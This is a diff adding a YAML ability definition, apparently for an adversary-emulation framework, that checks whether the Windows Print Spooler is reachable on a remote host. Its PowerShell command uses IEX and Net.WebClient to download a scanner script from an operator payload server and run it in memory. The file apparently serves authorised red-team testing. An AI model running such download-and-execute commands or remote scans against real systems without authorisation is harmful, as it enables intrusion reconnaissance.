@@ -1,0 +1,19 @@
+id: a5acacc4-6297-47f3-bb35-66575dd92694
+metadata:
+  version: 1
+  authors:
+    - vletoux
+    - w0rk3r
+  tags: []
+name: Check if Printer Spooler is remotely accessible
+description: |
+  Verifies if the Spooler is available on the specified remote host, using SpoolerScanner.
+tactic: discovery
+technique:
+  id: T1082
+  name: System Information Discovery
+platforms:
+  windows:
+    psh:
+      command: |
+        IEX (New-Object Net.Webclient).downloadstring('#{operator.payloads}/community/Invoke-SpoolerScanner.ps1'); Invoke-SpoolerScanner #{json.T1018.Name}
